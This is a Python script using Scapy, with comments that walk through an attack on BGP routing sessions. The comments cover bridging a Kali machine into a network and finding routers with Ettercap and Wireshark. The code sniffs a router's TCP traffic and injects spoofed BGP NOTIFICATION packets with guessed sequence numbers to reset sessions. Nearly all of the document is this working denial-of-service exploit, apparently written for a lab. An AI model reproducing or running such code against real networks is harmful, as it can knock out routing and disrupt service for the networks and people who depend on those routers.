#!/usr/bin/env python3
#Import time so we can set a sleep timer
import time
#Import scapy
from scapy.all import *
from scapy.all import sniff, Ether, IP, BGPPathAttr, TCP, BGPHeader, BGPUpdate, BGPPAOrigin, BGPPANextHop, BGPPAMultiExitDisc, BGPPALocalPref, BGPNLRI_IPv4
#Import BGP
load_contrib('bgp')

# Let's say there's a computer (compA) connects to a Switch
# in which, that Switch also connects to some BGP Routers

# Once you've connected your laptop (Kali VM host) to compA using LAN cables
# You 'bridge' your Kali's network adapter to compA NIC
# Ask for a BGP Router IP

# Use Ettercap & Wireshark to sniff all the devices in the network
# Find out all BGP Routers IP
# Enter 1 BPG Router IP for further sniffing
bgp_IP = input('Enter BGP Router dst IP [192.168.1.249]: ')
# This captures 1 packets from Switch to Internet BGP Router

# We need to know Src & Dst ports
# BGP uses TCP port 179
# Yet this depends on which BGP Router initiates the session

# Assume we have 2 BGP Routers, BGP Router A & BGP Router B

# If BGP Router A initiates the session to BGP Router B
# BGP Router B has dstPort = 179 on itself

# If BGP Router B initiates the session to BGP Router A
# BGP Router A has dstPort = 179 on itself

# The BGP Router that initiates Session to another BGP Router
# has randomPort, while the dstPort is on the other side

#Loop to sniff packets
for i in range (0, 5):
    #Sniff for a BGP packet - change IP address to the right IP address
    #pkt = sniff(filter="tcp and ip dst 192.168.1.249",count=1)
    pkt = sniff(filter=f'tcp and ip dst {bgp_IP}', count=1)

    for i in range (0, 10):
        #Create a new Ethernet frame
        frame1=Ether()
        #Set destination MAC address to captured BGP frame
        frame1.dst = pkt[0].dst
        #Set source MAC address to captured BGP frame
        frame1.src = pkt[0].src
        #Set Ethernet Type to captured BGP frame
        frame1.type = pkt[0].type
        #Set destination port to captured BGP packet TCP port number
        mydport = pkt[0].dport
        #Set source port to captured BGP packet TCP port number
        mysport = pkt[0].sport
        #Set sequence number to captured BGP packet + i (loop value)
        seq_num = pkt[0].seq + i
        #Set ack number to captured BGP packet 
        ack_num = pkt[0].ack
        #Set source IP address to captured BGP packet  
        ipsrc = pkt[0][IP].src
        #Set desination IP address to captured BGP packet  
        ipdst = pkt[0][IP].dst
        #Craft notification BGP packet. Type 3 is notification. Marker is a bunch of F's in hex  
        bgp_reset = IP(src=ipsrc, dst=ipdst, ttl=1)\
        /TCP(dport=mydport, sport=mysport, flags="PA", seq=seq_num, ack=ack_num)\
        /BGPHeader(marker=340282366920938463463374607431768211455, len=21,\
        type=3)
        #Send packet into network = frame1 + bgp_reset
        sendp(frame1/bgp_reset)
        frame1.show()
        bgp_reset.show()
        time.sleep(1)
